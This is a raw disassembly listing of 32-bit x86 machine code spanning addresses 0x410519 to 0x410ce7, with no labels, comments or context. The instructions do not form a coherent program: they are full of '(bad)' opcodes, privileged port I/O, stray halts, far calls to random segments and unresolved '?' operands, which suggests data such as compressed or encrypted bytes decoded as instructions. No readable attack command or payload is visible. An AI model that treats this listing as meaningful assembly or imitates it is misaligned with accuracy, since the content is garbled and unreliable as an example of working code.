  410519:	xor    DWORD PTR [esi+ebp*1-0x76e77a55],ebx
  410520:	repz bound sp,DWORD PTR [eax+0x7998b3ea]
  410528:	mov    esp,0x67ade3dd
  41052d:	xchg   BYTE PTR [edx],al
  41052f:	rol    ah,1
  410531:	cdq    
  410532:	cmc    
  410533:	mov    al,ds:0x2ce55784
  410538:	icebp  
  410539:	(bad)  
  41053a:	mov    ecx,0x1b689813
  41053f:	adc    ecx,0x6ce54797
  410545:	xchg   edi,eax
  410546:	into   
  410547:	push   edx
  410548:	adc    al,0x8a
  41054a:	test   DWORD PTR [ebx+0x1c],esi
  41054d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41054e:	cld    
  41054f:	aas    
  410550:	inc    edi
  410551:	jmp    0x4105bc
  410553:	or     DWORD PTR [eax+ebp*8-0x34],esp
  410557:	aam    0xc6
  410559:	push   eax
  41055a:	repnz call 0x4010:0xc6c05899
  410562:	call   0x83d5:0x362006d0
  410569:	pop    esp
  41056a:	lods   al,BYTE PTR ds:[esi]
  41056b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056c:	(bad)  
  41056e:	or     eax,0xfb9d4ea8
  410573:	jo     0x4104f9
  410575:	push   DWORD PTR [edi+0x5]
  410578:	mul    DWORD PTR ss:[ecx+0x279de434]
  41057f:	(bad)  [edi+0x31]
  410582:	dec    ecx
  410583:	or     bl,0x62
  410586:	ret    
  410587:	mov    bh,0x80
  410589:	inc    ebx
  41058a:	push   esi
  41058b:	mov    DWORD PTR [edi-0x64],ebp
  41058e:	or     eax,0xcb2d45f3
  410593:	cli    
  410594:	sbb    bh,0x6f
  410597:	in     al,dx
  410598:	jecxz  0x4105d5
  41059a:	mov    ebp,0xd4e3798f
  41059f:	outs   dx,DWORD PTR ds:[esi]
  4105a0:	mov    al,ds:0xf8a92b3f
  4105a5:	add    DWORD PTR [edx-0x2bfc99d5],edx
  4105ab:	xor    eax,0x64698bb1
  4105b0:	inc    eax
  4105b1:	inc    esp
  4105b2:	and    edx,eax
  4105b4:	push   esi
  4105b5:	mov    ah,0xb9
  4105b7:	ins    BYTE PTR es:[edi],dx
  4105b8:	xchg   BYTE PTR [esi+ebp*4+0x470f4463],cl
  4105bf:	mov    BYTE PTR [esi],cl
  4105c1:	pop    edi
  4105c2:	or     ebp,DWORD PTR [ecx+0x65]
  4105c5:	ins    BYTE PTR es:[edi],dx
  4105c6:	xchg   edi,eax
  4105c7:	adc    dh,BYTE PTR [edx+0x193b9889]
  4105cd:	dec    esp
  4105ce:	stos   DWORD PTR es:[edi],eax
  4105cf:	scas   eax,DWORD PTR es:[edi]
  4105d0:	pop    esp
  4105d1:	popf   
  4105d2:	sub    al,0xff
  4105d4:	dec    esp
  4105d5:	xchg   ebx,eax
  4105d6:	fwait
  4105d7:	mov    edi,0x166b24a0
  4105dc:	cmp    al,BYTE PTR [ebp-0x51bcf49]
  4105e2:	jp     0x4105a1
  4105e4:	test   eax,0xab551c83
  4105e9:	xchg   edi,eax
  4105ea:	(bad)
  4105ed:	in     eax,dx
  4105ee:	mov    ecx,0x5f0f45a5
  4105f3:	mov    bl,0xa0
  4105f5:	jl     0x410579
  4105f7:	dec    esp
  4105f8:	dec    esi
  4105f9:	and    bl,ah
  4105fb:	mov    ch,0xee
  4105fd:	int    0x39
  4105ff:	nop
  410600:	mov    bl,0xa9
  410602:	in     eax,0xe2
  410604:	data16 jno 0x41061c
  410607:	je     0x41060e
  410609:	repz and BYTE PTR es:[edx-0x24],0xa0
  41060f:	mov    DWORD PTR [esi+eax*8],eax
  410612:	into   
  410613:	xor    dl,cl
  410615:	xor    BYTE PTR [ecx-0x15ec179f],0x73
  41061c:	fs inc edx
  41061e:	or     DWORD PTR [eax+ecx*2],edx
  410621:	fnstsw WORD PTR [ebp+ecx*8+0x39]
  410625:	cmp    edi,DWORD PTR [edx-0x2a]
  410628:	fdivr  st(3),st
  41062a:	cs ds shl ebx,0xbc
  41062f:	mov    esi,0xcb672c82
  410634:	adc    ebx,DWORD PTR [ebx-0x3ef3298f]
  41063a:	fdivp  st(1),st
  41063c:	mov    ecx,0xfd1ca42b
  410641:	lds    ebx,FWORD PTR [edx+0x4675d0c6]
  410647:	jnp    0x410670
  410649:	or     BYTE PTR [esi+0x52],bl
  41064c:	or     al,ch
  41064e:	mov    edi,0xe04034f8
  410653:	enter  0x1c20,0xba
  410657:	mov    esi,0xa1f60c82
  41065c:	sub    al,0xff
  41065e:	pop    es
  41065f:	repnz adc esi,DWORD PTR [edx]
  410662:	or     DWORD PTR [eax+0x728d6dbd],0x3f
  410669:	in     al,0x81
  41066b:	lock and al,BYTE PTR [ebx]
  41066e:	push   0xe236950d
  410673:	push   cs
  410674:	jecxz  0x4106d8
  410676:	ret    0x2c9
  410679:	xchg   DWORD PTR [ebx],esi
  41067b:	mov    esi,0x8cf013dd
  410680:	jmp    0x545c:0x48083c3b
  410687:	xor    esi,DWORD PTR [eax-0x553aa4aa]
  41068d:	jnp    0x410706
  41068f:	push   edi
  410690:	retf   0x570e
  410693:	in     eax,0x41
  410695:	in     eax,0x27
  410697:	clc    
  410698:	mov    cl,0x9e
  41069a:	adc    DWORD PTR [ecx+0x24349fb1],0xffffff82
  4106a1:	cwde   
  4106a2:	ficom  DWORD PTR [edi+0x21a7809c]
  4106a8:	jecxz  0x410683
  4106aa:	out    0xb,eax
  4106ac:	mov    esp,0x9e1e3b81
  4106b1:	inc    ebp
  4106b2:	aaa    
  4106b3:	mov    ah,0xc7
  4106b5:	ja     0x41065b
  4106b7:	popa   
  4106b8:	mov    esp,0xdf732eff
  4106bd:	jo     0x41070a
  4106bf:	mov    ds:0x83323ca7,eax
  4106c4:	pop    ebp
  4106c5:	push   esi
  4106c6:	in     al,0x65
  4106c8:	sbb    dl,bl
  4106ca:	pop    esp
  4106cb:	icebp  
  4106cc:	aad    0xa2
  4106ce:	fmul   st,st(2)
  4106d0:	outs   dx,DWORD PTR ds:[esi]
  4106d1:	in     eax,0x19
  4106d3:	inc    esi
  4106d4:	mov    al,0x35
  4106d6:	cmp    DWORD PTR [esp+ecx*8+0x78],edx
  4106da:	aas    
  4106db:	xor    BYTE PTR [ecx],dl
  4106dd:	xchg   edx,eax
  4106de:	out    dx,al
  4106df:	mov    al,ds:0x56d3a844
  4106e4:	jl     0x4106cb
  4106e6:	mov    dl,0xee
  4106e8:	test   eax,0x6331f060
  4106ed:	mov    ds:0xdc590915,eax
  4106f2:	cdq    
  4106f3:	(bad)  
  4106f4:	fisub  DWORD PTR [ecx+0x4f]
  4106f7:	fstp   QWORD PTR [esi]
  4106f9:	jecxz  0x4106a8
  4106fb:	and    edi,ebx
  4106fd:	or     eax,0x504d2f16
  410702:	inc    ebp
  410703:	(bad)
  410706:	dec    eax
  410707:	popa   
  410708:	xor    ebx,DWORD PTR [ebp+ebx*4+0x47]
  41070c:	pop    edi
  41070d:	ds dec edi
  41070f:	ret    0xaca5
  410712:	or     al,0x32
  410714:	pop    edx
  410715:	call   DWORD PTR [ebx+0x74fd8bc3]
  41071b:	pop    edi
  41071c:	sub    BYTE PTR [edx],0x75
  41071f:	loop   0x410707
  410721:	mov    ch,al
  410723:	adc    ah,BYTE PTR [eax]
  410725:	fwait
  410726:	add    al,0x55
  410728:	sar    BYTE PTR [edx],0xe1
  41072b:	push   ss
  41072c:	mov    ah,0xcc
  41072e:	out    0x85,eax
  410730:	xchg   ecx,eax
  410731:	push   0x2fb43d8f
  410736:	xor    dh,BYTE PTR [esi-0x7a]
  410739:	sti    
  41073a:	pop    DWORD PTR [edi+0x3]
  41073d:	hlt    
  41073e:	icebp  
  41073f:	sbb    al,BYTE PTR [edx+0x65]
  410742:	cmp    BYTE PTR [ebx-0x6203ea1b],0xfa
  410749:	rol    DWORD PTR [edi-0x64],0x58
  41074d:	or     al,0xf6
  41074f:	call   0xcdea:0xf7817fcb
  410756:	icebp  
  410757:	cmp    DWORD PTR [esi+0x19],eax
  41075a:	lods   al,BYTE PTR cs:[esi]
  41075c:	jmp    FWORD PTR [ecx-0x50]
  41075f:	test   ebx,edx
  410761:	(bad)  
  410762:	xchg   edx,eax
  410763:	jne    0x41071a
  410765:	mov    eax,0x40c3dc37
  41076a:	call   0xc984110d
  41076f:	sbb    DWORD PTR [edx+edi*1+0xc4a4a34],eax
  410776:	inc    esp
  410777:	out    dx,al
  410778:	mov    dh,0x2a
  41077a:	pop    ebx
  41077b:	je     0x4107ce
  41077d:	ins    DWORD PTR es:[edi],dx
  41077e:	pop    ebp
  41077f:	in     eax,0x2f
  410781:	inc    edx
  410782:	inc    edi
  410783:	push   0x52ea887b
  410788:	dec    esi
  410789:	mov    dh,0xe1
  41078b:	xor    DWORD PTR [ecx-0x3823b953],edi
  410791:	pop    ebp
  410792:	push   cs
  410793:	sbb    eax,0x3d323476
  410798:	jp     0x41080e
  41079a:	dec    esp
  41079b:	add    bl,BYTE PTR [ecx-0x582fba8a]
  4107a1:	sar    BYTE PTR [ebx],cl
  4107a3:	ins    DWORD PTR es:[edi],dx
  4107a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107a5:	cmc    
  4107a6:	and    BYTE PTR [ebx-0x54],bh
  4107a9:	imul   ebx,DWORD PTR [ebp-0x8],0x1f
  4107ad:	mov    bl,0xcc
  4107af:	xchg   ebp,eax
  4107b0:	enter  0x5fe5,0x98
  4107b4:	(bad)  
  4107b5:	loop   0x410802
  4107b7:	and    al,0x7d
  4107b9:	pop    esp
  4107ba:	dec    eax
  4107bb:	mov    edi,0x12f22f81
  4107c0:	cmc    
  4107c1:	push   es
  4107c2:	inc    ecx
  4107c3:	mov    esp,0x96212580
  4107c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107c9:	sbb    eax,0x5895da12
  4107ce:	loopne 0x410845
  4107d0:	fcmovb st,st(0)
  4107d2:	cdq    
  4107d3:	call   0x8bf8:0x90246476
  4107da:	(bad)  
  4107dc:	lods   eax,DWORD PTR ds:[esi]
  4107dd:	lds    ecx,FWORD PTR [eax]
  4107df:	dec    esi
  4107e0:	and    al,0x53
  4107e2:	push   es
  4107e3:	lock loop 0x41081c
  4107e6:	in     eax,dx
  4107e7:	push   0x1efaa4fa
  4107ec:	or     al,ah
  4107ee:	xor    eax,0x846679ff
  4107f3:	cmova  edx,DWORD PTR [ebx-0x22]
  4107f7:	fst    DWORD PTR [esi]
  4107f9:	mov    ebx,0xe0819b7e
  4107fe:	stc    
  4107ff:	data16 ffreep st(4)
  410802:	push   ebx
  410803:	cdq    
  410804:	adc    ah,BYTE PTR [ecx-0x76]
  410807:	sbb    al,BYTE PTR [esp+ebx*1-0x24495d7e]
  41080e:	xor    al,0xfc
  410810:	xchg   edi,eax
  410811:	str    WORD PTR [edi]
  410814:	rol    BYTE PTR [edi-0x593cbb3],1
  41081a:	pop    ds
  41081b:	or     bl,bl
  41081d:	xor    ebp,eax
  41081f:	mov    ch,0x97
  410821:	pop    eax
  410822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410823:	scas   eax,DWORD PTR es:[edi]
  410824:	xchg   esp,eax
  410825:	dec    edi
  410826:	fwait
  410827:	ja     0x4107f8
  410829:	outs   dx,BYTE PTR ds:[esi]
  41082a:	retf   0x6c12
  41082d:	(bad)  
  41082e:	or     al,0x47
  410830:	sub    BYTE PTR [edi+0x6a79c970],ah
  410836:	xchg   edx,eax
  410837:	cmp    al,dl
  410839:	mov    WORD PTR [edx-0x2],cs
  41083c:	stc    
  41083d:	mov    bh,0x91
  41083f:	leave  
  410840:	scas   eax,DWORD PTR es:[edi]
  410841:	adc    BYTE PTR [edx-0x1b],al
  410844:	fcomp  DWORD PTR [edx-0xdbc5d3f]
  41084a:	mov    dh,0x4d
  41084c:	jge    0x4108c8
  41084e:	jnp    0x4108b2
  410850:	xlat   BYTE PTR ds:[ebx]
  410851:	shl    DWORD PTR ds:0x2d71fca5,1
  410857:	test   al,0xe4
  410859:	shr    DWORD PTR [eax-0x15e272c1],1
  41085f:	sbb    BYTE PTR [eax+0x202a6cf0],bl
  410865:	cmc    
  410866:	daa    
  410867:	mov    edi,0x97b6dfea
  41086c:	add    DWORD PTR [edx+0x70],0xffffffb4
  410870:	loop   0x410839
  410872:	in     eax,dx
  410873:	les    esi,FWORD PTR [ecx+0x27780fd2]
  410879:	add    eax,0xb2a3c12f
  41087e:	cmp    DWORD PTR ds:[eax],0xb66f6c75
  410885:	adc    ebx,ecx
  410887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410888:	lods   eax,DWORD PTR ds:[esi]
  410889:	imul   ebx,DWORD PTR [ebx+0x287d7515],0x5ddceb27
  410893:	or     ebx,DWORD PTR [ebx+0x3d]
  410896:	sbb    al,0xef
  410898:	mov    esp,0xdc216bb1
  41089d:	adc    DWORD PTR es:[ebx-0x6a7e8d32],esp
  4108a4:	mov    ds:0x84aaf352,al
  4108a9:	add    ebx,DWORD PTR [ebx]
  4108ab:	xchg   BYTE PTR [ecx],dl
  4108ad:	jg     0x410858
  4108af:	mov    dh,0x9c
  4108b1:	jmp    0xe596:0xaeae40cb
  4108b8:	stos   DWORD PTR es:[edi],eax
  4108b9:	mov    bh,0x10
  4108bb:	std    
  4108bc:	jg     0x410907
  4108be:	in     al,0x49
  4108c0:	and    edi,ebx
  4108c2:	loop   0x4108c6
  4108c4:	popf   
  4108c5:	add    BYTE PTR [edx],bl
  4108c7:	fs sahf 
  4108c9:	mov    edi,0xa2f0e826
  4108ce:	mov    ah,0xf7
  4108d0:	pop    ecx
  4108d1:	jb     0x4108ab
  4108d3:	pusha  
  4108d4:	cmc    
  4108d5:	push   es
  4108d6:	pop    esi
  4108d7:	mov    DWORD PTR [ebp-0x62],esi
  4108da:	stos   BYTE PTR es:[edi],al
  4108db:	data16 std 
  4108dd:	out    dx,al
  4108de:	mov    ds:0xd815e4,eax
  4108e3:	or     al,0x6
  4108e5:	fldl2e 
  4108e7:	xchg   esi,eax
  4108e8:	xchg   esp,eax
  4108e9:	imul   ecx,DWORD PTR [edx-0x539cb753],0x4d121735
  4108f3:	ret    
  4108f4:	xchg   BYTE PTR [edx-0x4],al
  4108f7:	jbe    0x410902
  4108f9:	leave  
  4108fa:	mov    BYTE PTR [esi],0x20
  4108fd:	add    edi,DWORD PTR [ecx+0x64]
  410900:	fwait
  410901:	pop    es
  410902:	dec    esi
  410903:	shl    BYTE PTR [ecx-0x3f4e41e8],cl
  410909:	outs   dx,BYTE PTR ds:[esi]
  41090a:	jae    0x41089e
  41090c:	xchg   dl,cl
  41090e:	inc    esi
  41090f:	retf   
  410910:	pop    edx
  410911:	sub    eax,0xf34b994c
  410916:	xor    al,BYTE PTR [edi+0x7a]
  410919:	adc    DWORD PTR [edx+ebp*4],edx
  41091c:	pop    ecx
  41091d:	mov    ecx,0x930994b
  410922:	xchg   esp,eax
  410923:	hlt    
  410924:	and    BYTE PTR [ebx-0x33],ah
  410927:	(bad)  
  410928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410929:	jne    0x410927
  41092b:	out    0xbd,eax
  41092d:	cmp    BYTE PTR [edi-0x2a5f0392],al
  410933:	rcr    ah,1
  410935:	lods   eax,DWORD PTR ds:[esi]
  410936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410937:	xchg   ebx,eax
  410939:	pop    ebx
  41093a:	popf   
  41093b:	retf   0x9de5
  41093e:	add    DWORD PTR [eax],0x49def801
  410944:	ins    DWORD PTR es:[edi],dx
  410945:	imul   DWORD PTR [eax-0x60]
  410948:	and    DWORD PTR [ebp-0x12],edx
  41094b:	fcom   QWORD PTR ds:0x251bdf8
  410951:	ja     0x4109a2
  410953:	pop    ds
  410954:	add    eax,0x571d4738
  410959:	cmp    eax,0x6dde8685
  41095e:	mov    eax,0xada48d9
  410963:	ja     0x41091b
  410965:	jbe    0x4109ba
  410967:	sar    DWORD PTR ds:0xcaee1cf6,1
  41096d:	cmp    eax,0x9310a5bd
  410972:	shl    ch,cl
  410974:	test   eax,0x8e346121
  410979:	inc    ebp
  41097a:	push   esp
  41097b:	mov    bh,0x10
  41097d:	push   ss
  41097e:	inc    esi
  41097f:	cmp    WORD PTR [edx+edx*1+0x1daaa44d],bx
  410987:	pop    DWORD PTR [eax-0x68397c5e]
  41098d:	lods   eax,DWORD PTR ds:[esi]
  41098e:	mov    dh,0x4b
  410990:	xor    al,al
  410992:	neg    esi
  410994:	pushf  
  410995:	jecxz  0x410996
  410997:	arpl   WORD PTR [ecx],di
  410999:	push   edi
  41099a:	mov    eax,ds:0x7e6ac256
  41099f:	push   ecx
  4109a0:	jmp    0xf3c4885c
  4109a5:	pop    esi
  4109a6:	sbb    cl,BYTE PTR [ecx+0x66]
  4109a9:	mov    ecx,0x303c899a
  4109ae:	dec    ecx
  4109af:	imul   ecx,DWORD PTR [eax+0x4c],0x296969f5
  4109b6:	push   0x3d980cde
  4109bb:	jne    0x41099a
  4109bd:	cmp    eax,0x5c28214d
  4109c2:	mov    edx,0x5f5ede4a
  4109c7:	cmp    BYTE PTR [edx+0x298985ff],ch
  4109cd:	xlat   BYTE PTR ds:[ebx]
  4109ce:	and    al,0xce
  4109d0:	and    eax,0xa693c4a2
  4109d5:	mov    cl,0x82
  4109d7:	out    0xf0,eax
  4109d9:	ins    BYTE PTR es:[edi],dx
  4109da:	loopne 0x4109f7
  4109dc:	sti    
  4109dd:	leave  
  4109de:	push   esp
  4109df:	ins    BYTE PTR es:[edi],dx
  4109e0:	(bad)  
  4109e2:	sub    BYTE PTR [ecx-0x66],al
  4109e5:	test   BYTE PTR [edx-0x72],0xee
  4109e9:	add    BYTE PTR [edi-0x317cb0cc],bh
  4109ef:	xchg   BYTE PTR [ecx+0x1737f5df],dh
  4109f5:	xchg   BYTE PTR [ebp+0x6676eedc],al
  4109fb:	add    ebx,ebp
  4109fd:	cld    
  4109fe:	test   DWORD PTR [edx],edx
  410a00:	inc    esi
  410a01:	cdq    
  410a02:	push   edx
  410a03:	jecxz  0x410a52
  410a05:	cs stc 
  410a07:	not    DWORD PTR [esi-0x76f2fb05]
  410a0d:	jle    0x410a34
  410a0f:	push   0x3b
  410a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a12:	cmp    ecx,edi
  410a14:	pop    edi
  410a15:	xor    al,0x74
  410a17:	cmp    al,0xcb
  410a19:	fstp   DWORD PTR [esi-0x21]
  410a1c:	(bad)  
  410a1e:	mov    ecx,0xc7ce98cc
  410a23:	xchg   esi,eax
  410a24:	adc    BYTE PTR [eax+ebp*1],dl
  410a27:	pop    eax
  410a28:	rcr    BYTE PTR [ecx-0x16d377ab],0x95
  410a2f:	push   0x11b6fafa
  410a34:	inc    ecx
  410a35:	pop    eax
  410a36:	cmp    DWORD PTR [ecx],ebx
  410a38:	lahf   
  410a39:	cwde   
  410a3a:	popa   
  410a3b:	mov    ah,0x5a
  410a3d:	iret   
  410a3e:	ins    BYTE PTR es:[edi],dx
  410a3f:	fisttp WORD PTR [eax]
  410a41:	pop    ebp
  410a42:	sar    eax,0x46
  410a45:	xchg   edx,eax
  410a46:	shl    DWORD PTR [edx],0xcc
  410a49:	or     BYTE PTR [ebp+0x5d],bl
  410a4c:	push   edi
  410a4d:	sete   BYTE PTR [esi+0x4a66cfdb]
  410a54:	jbe    0x410aa2
  410a56:	cwde   
  410a57:	mov    ch,BYTE PTR [ecx]
  410a59:	fsub   DWORD PTR [bx+si]
  410a5c:	sar    BYTE PTR [edx],cl
  410a5e:	call   0xe85c:0x74f8d952
  410a65:	add    ecx,ebx
  410a67:	ficomp DWORD PTR [esi+ecx*4]
  410a6a:	jle    0x410a97
  410a6c:	cmp    ch,BYTE PTR [ecx+0x6598c52f]
  410a72:	jbe    0x410a7a
  410a74:	(bad)  
  410a75:	adc    ah,bl
  410a77:	test   al,0x2f
  410a79:	pop    eax
  410a7a:	mov    DWORD PTR [edi],eax
  410a7c:	retf   
  410a7d:	test   al,0x52
  410a7f:	sbb    edx,DWORD PTR ss:[edi]
  410a82:	aad    0x1d
  410a84:	push   ss
  410a85:	lds    edi,FWORD PTR [ebp-0x24]
  410a88:	data16 jno 0x410a6d
  410a8b:	mov    ah,0x88
  410a8d:	test   eax,0xd1cb4ec8
  410a92:	pop    ds
  410a93:	jle    0x410a7a
  410a95:	adc    eax,0xc6bce1c8
  410a9a:	popa   
  410a9b:	mov    cl,0xd9
  410a9d:	ffree  st(5)
  410a9f:	aad    0x1e
  410aa1:	aad    0x20
  410aa3:	mov    DWORD PTR [ebx],eax
  410aa5:	test   BYTE PTR [eax],0x3e
  410aa8:	xlat   BYTE PTR ds:[ebx]
  410aa9:	inc    edx
  410aaa:	aaa    
  410aab:	add    BYTE PTR [edi-0x62e138ca],dh
  410ab1:	jns    0x410aff
  410ab3:	(bad)  
  410ab4:	mov    ah,0x5c
  410ab6:	add    esi,ebp
  410ab8:	pusha  
  410ab9:	rcr    BYTE PTR [eax-0x6bb7335c],cl
  410abf:	push   ebp
  410ac0:	xlat   BYTE PTR ds:[ebx]
  410ac1:	sub    ch,BYTE PTR [ebp-0x51]
  410ac4:	mov    ds:0x30db8916,eax
  410ac9:	jmp    0xb67e37e8
  410ace:	jnp    0x410ad0
  410ad0:	jmp    0x410b09
  410ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ad3:	inc    esp
  410ad4:	dec    esi
  410ad5:	aam    0x82
  410ad7:	inc    esp
  410ad8:	in     al,0x96
  410ada:	int3   
  410adb:	ret    0x2e11
  410ade:	shr    DWORD PTR [ecx-0x4a73056a],cl
  410ae4:	cmp    esi,eax
  410ae6:	mov    ebx,0xe9a1e055
  410aeb:	ret    
  410aec:	adc    bh,dl
  410aee:	sub    ebx,DWORD PTR [ebx]
  410af0:	or     DWORD PTR [edx],0x64923017
  410af6:	and    edi,DWORD PTR [edx]
  410af8:	mov    dl,0x30
  410afa:	fwait
  410afb:	cdq    
  410afc:	cld    
  410afd:	sub    ecx,DWORD PTR [ebx+ebx*4]
  410b00:	mov    WORD PTR ds:0x93036c6d,es
  410b06:	and    eax,0x59a10625
  410b0b:	mov    ?,ebx
  410b0d:	push   cs
  410b0e:	xor    DWORD PTR [ebx-0x3f2d2ce4],0xffffffaf
  410b15:	and    BYTE PTR ds:0x209e4a9e,dh
  410b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b1c:	jb     0x410b10
  410b1e:	loop   0x410af4
  410b20:	cli    
  410b21:	loopne 0x410b04
  410b23:	add    ebp,DWORD PTR [edx+edi*2+0x2a]
  410b27:	jnp    0x410ae8
  410b29:	pop    ebx
  410b2a:	mov    ch,0xfe
  410b2c:	jle    0x410b96
  410b2e:	mov    ch,BYTE PTR [edi+0x6d2ec79e]
  410b34:	push   esp
  410b35:	iret   
  410b36:	inc    ecx
  410b37:	and    eax,0x52d4d365
  410b3c:	or     ch,0x1d
  410b3f:	jle    0x410b33
  410b41:	sbb    al,0x47
  410b44:	adc    cl,bh
  410b46:	adc    al,0xb8
  410b48:	jmp    0x410b9b
  410b4a:	clc    
  410b4b:	lahf   
  410b4c:	test   BYTE PTR [ebp+0x6a],ah
  410b4f:	push   esi
  410b50:	inc    edx
  410b51:	and    cl,BYTE PTR [esi+0x1d03bbf0]
  410b57:	mov    eax,0x53db42d7
  410b5c:	fistp  DWORD PTR [ebx+0x4]
  410b5f:	hlt    
  410b60:	mov    al,0x85
  410b62:	push   ecx
  410b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b64:	shl    dh,cl
  410b66:	mov    BYTE PTR [edi],bh
  410b68:	mov    eax,ds:0xeed0a1bb
  410b6d:	mov    DWORD PTR [ecx+0x34efd6a8],eax
  410b73:	scas   al,BYTE PTR es:[edi]
  410b74:	mov    eax,ds:0xd309dfcf
  410b79:	(bad)  
  410b7a:	nop    esi
  410b7d:	stc    
  410b7e:	mov    WORD PTR [ebx-0x41],ds
  410b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b82:	xor    BYTE PTR [eax+edx*2],ah
  410b85:	aas    
  410b86:	sub    al,0x9a
  410b88:	xor    al,0xc5
  410b8a:	hlt    
  410b8b:	push   ebx
  410b8c:	inc    edx
  410b8d:	arpl   WORD PTR [eax-0x6aef8c9f],cx
  410b93:	cwde   
  410b94:	icebp  
  410b95:	scas   al,BYTE PTR es:[edi]
  410b96:	xchg   DWORD PTR [ebx+0x22c6d644],eax
  410b9c:	pop    ss
  410b9d:	xchg   edi,eax
  410b9e:	pop    ebx
  410b9f:	pop    es
  410ba0:	push   cs
  410ba1:	xor    BYTE PTR [esi],dh
  410ba3:	adc    eax,0x38938f70
  410ba8:	int    0xe2
  410baa:	cmc    
  410bab:	push   esp
  410bac:	xor    al,0x40
  410bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410baf:	nop
  410bb0:	pop    ecx
  410bb1:	jl     0x410c1f
  410bb3:	icebp  
  410bb4:	out    dx,eax
  410bb5:	std    
  410bb6:	mov    ebp,0xf6f7ec4a
  410bbb:	add    DWORD PTR [edx+0x7d],edi
  410bbe:	aaa    
  410bbf:	fidivr WORD PTR [esi+eiz*1+0x2b]
  410bc3:	sar    DWORD PTR [ecx+0x72147a98],cl
  410bc9:	xchg   BYTE PTR [esi+0x5df427f5],ch
  410bcf:	jns    0x410bc0
  410bd1:	stos   DWORD PTR es:[edi],eax
  410bd2:	mov    ds:0x1bc95814,eax
  410bd7:	aad    0x59
  410bd9:	lock mov edx,ecx
  410bdc:	aas    
  410bdd:	add    al,0x22
  410bdf:	xchg   edi,eax
  410be0:	imul   esp,DWORD PTR [esi-0x3e],0xffffffaf
  410be4:	jae    0x410c5c
  410be6:	imul   eax,ecx,0xffffffed
  410be9:	jmp    0xb7a41c59
  410bee:	xchg   ebp,eax
  410bef:	in     eax,0xec
  410bf1:	ds xchg esi,eax
  410bf3:	aas    
  410bf4:	push   ecx
  410bf5:	pop    ebx
  410bf6:	imul   esi,DWORD PTR [edx],0x64
  410bf9:	out    dx,eax
  410bfa:	pop    es
  410bfb:	push   edx
  410bfc:	jp     0x410c77
  410bfe:	sub    DWORD PTR [ecx-0x23f8097b],eax
  410c04:	rol    DWORD PTR [edi-0x68d5dd45],1
  410c0a:	mov    ebx,0xf506f005
  410c0f:	sub    BYTE PTR [edx+0x42],0xc8
  410c13:	adc    DWORD PTR [ecx-0x2],eax
  410c16:	lods   al,BYTE PTR ds:[esi]
  410c17:	scas   eax,DWORD PTR es:[edi]
  410c18:	and    al,0xe4
  410c1a:	cmp    cx,cx
  410c1d:	pushf  
  410c1e:	sub    eax,0x3600596b
  410c23:	push   eax
  410c24:	jge    0x410c76
  410c26:	je     0x410c1f
  410c28:	jae    0x410c73
  410c2a:	arpl   WORD PTR [esi],ax
  410c2c:	or     BYTE PTR [eax-0x22],ch
  410c2f:	pushf  
  410c30:	cmp    DWORD PTR [edi-0x601019a1],eax
  410c36:	cwde   
  410c37:	loope  0x410ca8
  410c39:	(bad)  
  410c3a:	hlt    
  410c3b:	sub    eax,0xecdeaa40
  410c40:	sbb    BYTE PTR [eax],dl
  410c42:	call   FWORD PTR [edx-0x11]
  410c45:	cli    
  410c46:	jg     0x410cb4
  410c48:	inc    ebx
  410c49:	fsub   st,st(2)
  410c4b:	es pop ecx
  410c4d:	fist   WORD PTR [esi]
  410c4f:	sbb    eax,0x3f0ab9a3
  410c54:	nop
  410c55:	stc    
  410c56:	pop    eax
  410c57:	adc    al,0x7d
  410c59:	mov    ebx,0x897db7cb
  410c5e:	mov    al,ds:0xcbab3c71
  410c63:	push   0x36
  410c65:	cwde   
  410c66:	enter  0xd1c2,0x68
  410c6a:	inc    edx
  410c6b:	and    edi,edi
  410c6d:	mov    ?,WORD PTR [ebp-0x7190dd08]
  410c73:	adc    bl,BYTE PTR [ecx]
  410c75:	retf   
  410c76:	sbb    dh,BYTE PTR [edx+ebp*8-0x1d501e04]
  410c7d:	xchg   ecx,eax
  410c7e:	bound  esi,QWORD PTR [ebx-0x5a]
  410c81:	mov    al,ds:0x33dcd30e
  410c86:	cmp    eax,0x3ccb9ec6
  410c8b:	inc    esi
  410c8c:	out    dx,eax
  410c8d:	stc    
  410c8e:	imul   edi,DWORD PTR [ebx+0x60646629],0x67
  410c95:	gs dec ebx
  410c97:	jmp    0x410ca4
  410c99:	popa   
  410c9a:	push   ds
  410c9b:	clc    
  410c9c:	jno    0x410c2a
  410c9e:	je     0x410c8c
  410ca0:	adc    BYTE PTR [edx+0x2fabd84],dl
  410ca6:	ins    DWORD PTR es:[edi],dx
  410ca7:	cmp    DWORD PTR [edx-0x458ed823],edi
  410cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cae:	les    esp,FWORD PTR [ecx-0x690214fb]
  410cb4:	push   esp
  410cb5:	mov    dl,0x37
  410cb7:	sbb    DWORD PTR [edx],0x7318f751
  410cbd:	xor    eax,0x9e7a45a3
  410cc2:	push   cs
  410cc3:	data16 mov ch,0x86
  410cc6:	int3   
  410cc7:	adc    esp,esi
  410cc9:	loope  0x410d14
  410ccb:	xchg   esi,eax
  410ccc:	pop    edi
  410ccd:	and    al,0x78
  410ccf:	ret    0x81d6
  410cd2:	shr    DWORD PTR [ebp-0x47],1
  410cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd7:	jo     0x410d30
  410cd9:	arpl   cx,di
  410cdb:	retf   0x6e6c
  410cde:	mov    ecx,0xcbcb5811
  410ce3:	push   esi
  410ce4:	test   BYTE PTR [edx+0xc],bh
  410ce7:	loopne 0x410d53
